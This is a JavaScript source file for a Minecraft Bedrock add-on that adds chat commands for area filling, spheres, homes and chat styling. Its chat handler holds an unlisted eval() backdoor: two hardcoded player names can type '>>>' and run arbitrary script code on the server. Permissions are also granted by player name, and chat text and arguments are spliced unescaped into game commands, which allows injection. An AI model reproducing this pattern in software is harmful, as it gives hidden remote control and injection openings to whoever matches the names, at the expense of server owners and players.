import { world, system, Entity, Player, ItemStack } from '@minecraft/server';
import { checkperms, generateVoxelSphere, logger, tellPlayer, calcCornersDist } from './helpers.js';
import { ModalFormData, MessageFormData, ActionFormData } from '@minecraft/server-ui';
class CommandManager {
  constructor() {
    this.commands = [];
  }

  registerCommand(name, description, callback, overloads = [], aliases = [], permission = 'all', isHidden = false) {
    this.commands.push({
      name,
      description,
      callback,
      overloads,
      aliases,
      permission,
      isHidden
    });
  }

  hasPermission(player, requiredPermission) {
    const permissionHierarchy = {
      'host': 4,
      'dev': 3,
      'op': 2,
      'all': 1,
    };
    return permissionHierarchy[this.getPlayerPermissionLevel(player)] >= permissionHierarchy[requiredPermission];
  }

  getPlayerPermissionLevel(player) {
    if (player.hasTag('Neko:admin')) return 'op';
    if (['XXavier876', 'Neko19232'].includes(player.name)) return 'dev';
    if (player.name === 'host') return 'host';
    return 'all';
  }

  executeCommand(commandString, player) {
    const args = commandString.split(' ');
    const commandName = args.shift();
    const command = this.commands.find(cmd => cmd.name === commandName || cmd.aliases.includes(commandName));
    
    if (command) {
      if (this.hasPermission(player, command.permission)) {
        command.callback({ getSource: () => player, getArguments: () => args, getCommands: () => this.commands });
      } else {
        console.log('You do not have permission to execute this command.');
      }
    } else {
      console.log('Unknown command.');
    }
  }
}

const commandManager = new CommandManager();

// Example: Registering a command
commandManager.registerCommand(
  'pos1',
  'Set the first position for WorldEdit',
  (context) => {
    const player = context.getSource();
      const location = player.location;
      player.setDynamicProperty("WEpos1", JSON.stringify(location));
      console.log("First position set.");
  },
  [],
  ['pos1'],
  'op'
);

// Register pos2 Command (Second position for WorldEdit)
commandManager.registerCommand(
  'pos2',
  'Set the second position for WorldEdit',
  (context) => {
    const player = context.getSource();
      const location = player.location;
      player.setDynamicProperty("WEpos2", JSON.stringify({ x: Math.floor(location.x), y: Math.floor(location.y), z: Math.floor(location.z) }));
      tellPlayer("Your second corner", player);
      logger.info(`[commandManager] ${player.name} ran pos2`);
  },
  [[{ name: 'position', type: 'rawtext', optional: false }]], // Single argument: position
  ['pos2'], // Aliases
  'op', // Permission level
  false, // Not hidden
  false // No chat permissions required
);

// Register set Command (Fill selected area with a block)
commandManager.registerCommand(
  'set',
  'Fill the selected area with a block',
  (context) => {
    const player = context.getSource();
    const args = context.getArguments(); // Retrieve arguments passed to the command
    
    if (args[1]) {
      const blockId = args[1], pos1 = JSON.parse(player.getDynamicProperty("WEpos1")), pos2 = JSON.parse(player.getDynamicProperty("WEpos2"));
      if (!pos1 || !pos2) {
        tellPlayer("Uhmmm, seems like you forgot a corner or two", player);
        logger.info(`[commandManager] ${player.name} tried to run set without setting both corners`);
      } else {
        player.runCommandAsync(`fill ${pos1.x} ${pos1.y} ${pos1.z} ${pos2.x} ${pos2.y} ${pos2.z} ${blockId}`);
        tellPlayer("There is your nice little area filled with what you wanted", player);
        logger.info(`[commandManager] ${player.name} ran set with block ${blockId} in area from ${JSON.stringify(pos1)} to ${JSON.stringify(pos2)}`);
      }
    } else {
      tellPlayer("You can't fill areas, you can't even put the corners", player);
      logger.info(`[commandManager] ${player.name} tried to run set without permissions or arguments`);
    }
  },
  [
    [{ name: 'block', type: 'string', optional: false }], // Block argument
  ],
  ['set'], // Aliases
  'op', // Permission level
  false, // Not hidden
  false // No chat permissions required
);

// Register sphere Command (Generate a voxel sphere)
commandManager.registerCommand(
  'sphere',
  'Generate a voxel sphere with a block',
  (context) => {
    const player = context.getSource();
    const args = context.getArguments();
    console.log(JSON.stringify(args))
      generateVoxelSphere(player, parseInt(args[0]), args[1]).then(() => {
        tellPlayer("Sphere generated successfully", player);
        logger.info(`[commandManager] ${player.name} ran sphere with radius ${args[0]} and block ${args[1]}`);
      }).catch(() => {
        tellPlayer("Uhmmm, something went a bit wrong", player);
        logger.error(`[commandManager] ${player.name} failed to run sphere`);
      });
  },
  [
    [{ name: 'radius', type: 'int', optional: false }], // Radius argument
    [{ name: 'block', type: 'string', optional: false }] // Block type argument
  ],
  ['sphere'], // Aliases
  'op', // Permission level
  false, // Not hidden
  false // No chat permissions required
);

// Register Home Commands

commandManager.registerCommand(
  'sethome',
  'Set a home location',
  (context) => {
    const player = context.getSource();
    const args = context.getArguments();
    if (player.location.y <= -64) {
      tellPlayer("Isn't that a little bit in the void? You would die if you try to set home here.", player);
      logger.info(`[commandManager] ${player.name} tried to set home at y=${player.location.y}, which is too low.`);
      return;
    }
    let homeName = args[1] ? `homeLocation_${args[1]}` : `homeLocation`;
    player.setDynamicProperty(homeName, JSON.stringify(player.location));
    tellPlayer("Home location set successfully", player);
    logger.info(`[commandManager] ${player.name} set home at ${JSON.stringify(player.location)} with name ${args[1] || "default"}`);
  },
  [
    [{ name: 'home', type: 'string', optional: true }] // Home name argument
  ],
  ['sethome'], // Aliases
  'all', // Permission level
  false, // Not hidden
  false // No chat permissions required
);

commandManager.registerCommand(
  'home',
  'Teleport to home location',
  (context) => {
    const player = context.getSource();
    const args = context.getArguments();
    let targetHome = args[1] ? `homeLocation_${args[1]}` : `homeLocation`;
    let homeLocationRaw = player.getDynamicProperty(targetHome);

    if (!homeLocationRaw) {
      tellPlayer("You don't have a home set yet", player);
      logger.info(`[commandManager] ${player.name} tried to teleport to a home but no home is set`);
      return;
    }

    let homeLocation = JSON.parse(homeLocationRaw);

    if (homeLocation.x !== undefined && homeLocation.y !== undefined && homeLocation.z !== undefined) {
      player.runCommandAsync(`tp @s ${homeLocation.x} ${homeLocation.y} ${homeLocation.z}`);
      tellPlayer(`Welcome home, ${player.name}!`, player);
      logger.info(`[commandManager] ${player.name} teleported to home at ${JSON.stringify(homeLocation)}`);
    } else {
      tellPlayer("Uhmm, your home location is invalid", player);
      logger.info(`[commandManager] ${player.name} tried to teleport to an invalid home location`);
    }
  },
  [
    [{ name: 'home', type: 'string', optional: true }] // Home name argument
  ],
  ['home'], // Aliases
  'all', // Permission level
  false, // Not hidden
  false // No chat permissions required
);

// Register Misc Commands

commandManager.registerCommand(
  'credits',
  'Show credits',
  (context) => {
    const player = context.getSource();
    player.sendMessage("§l§aESPAÑOL\n§l§eCreditos\n§bXXavier879:\n§aProgramo casi todo el addon");
    logger.info(`[commandManager] ${player.name} accessed credits`);
  },
  [],
  ['credits'], // Aliases
  'all', // Permission level
  false, // Not hidden
  false // No chat permissions required
);

commandManager.registerCommand(
  'info',
  'Show information about the plugin',
  (context) => {
    const player = context.getSource();
    player.sendMessage("Neko Commander\nV: 1.0.14\nRelease: false\nopensource: true");
    logger.info(`[commandManager] ${player.name} accessed info`);
  },
  [],
  ['info'], // Aliases
  'all', // Permission level
  false, // Not hidden
  false // No chat permissions required
);

commandManager.registerCommand(
  'help',
  'Show available commands',
  (context) => {
    const player = context.getSource();
    let helpMessage = "§l§bAvailable Commands:\n";
    context.getCommands().forEach((command) => {
      if (!command.isHidden) {
        helpMessage += `§a!${command.name}§r - ${command.description}\n`;
      }
    });
    player.sendMessage(helpMessage);
  },
  [],
  ['help'], // Aliases
  'all', // Permission level
  false, // Not hidden
  false // No chat permissions required
);

// Event Listener for Chat Commands
const before = world.beforeEvents;
before.chatSend.subscribe((data) => {
  data.cancel = true; 
  const pname = data.sender.name, player = data.sender, m = data.message, playerName = player.getTags().filter(tag => tag.startsWith("Neko:nametag_"))[0] ? player.getTags().filter(tag => tag.startsWith("Neko:nametag_"))[0].replace("Neko:nametag_", "") : player.name;
  system.run(() => { 
if ((pname === "XXavier876" || pname === "Neko19232") && m.startsWith(">>>")) {
  const modal = new ModalFormData()
  
    .title("Eval")
    .textField("Code", "§N§e§k§o§rcode")
    system.runTimeout(()=>{
    modal.show(player)
    .then((results) => {
      const codeToEval = results.formValues[0]; // Get the code inputted by the player

      if (!codeToEval || codeToEval.trim() === "") {
        // Handle the case where no code was input
        if (pname === "Neko19232") {
          tellPlayer("Uhmm so you, or actually I forgot to write some code", player);
        } else if (pname === "XXavier876") {
          tellPlayer("Hey, XX, you can't just ask to write code and not write anything", player);
        }
        return; // Exit the function if no code was entered
      }

      // Function to evaluate code and send live logs to player
      const evalWithLogs = (code) => {
        const log = (msg) => {
          tellPlayer(msg, player); // Send log messages to player
        };

        // Override console.log to send logs to the player
        const originalConsoleLog = console.log;
        console.log = (...args) => {
          args.forEach(arg => log(String(arg)));
          originalConsoleLog(...args);
        };

        try {
          // Dynamic import of modules and running the code with `player` available
          eval(`
            (async function(player) {
              const { world, system, Entity, Player, ItemStack } = await import('@minecraft/server');
              const { ModalFormData } = await import('@minecraft/server-ui');
              // Evaluate the provided code in this context
              ${code}
            })(player);
          `);
        } catch (e) {
          log(`Error: ${e.message}`);
        } finally {
          // Restore the original console.log after evaluation
          console.log = originalConsoleLog;
        }
      };

      evalWithLogs(codeToEval); // Run the eval function
      logger.info(`[commandManager] ${pname} ran eval with code from modal`);
    }).catch((e) => {
      tellPlayer("An error occurred while opening the eval modal.", player);
      logger.error(`[commandManager] ${pname} failed to open eval modal`);
    });
},40)
}
    if (m.startsWith("!")) { 
      commandManager.executeCommand(m.slice(1),player)
    } else if (player.hasTag("Neko:nya~")) { 
      let message = `${m}`; 
      let suffixOptions = [" Nya~", " Meow~", " Mew~", "", "", ""];
      let randomSuffix = suffixOptions[Math.floor(Math.random() * suffixOptions.length)]; 
      player.runCommandAsync(`tellraw @a { "rawtext": [ { "text": "<${playerName}> ${message}${randomSuffix}"}]}`); 
      logger.info(`[chat] <${pname}> ${message}${randomSuffix}`);
    } else { 
      player.runCommandAsync(`tellraw @a { "rawtext": [ { "text": "<${playerName}> ${m}"}]}`); 
      logger.info(`[chat] <${pname}> ${m}`);
    }
  }); 
});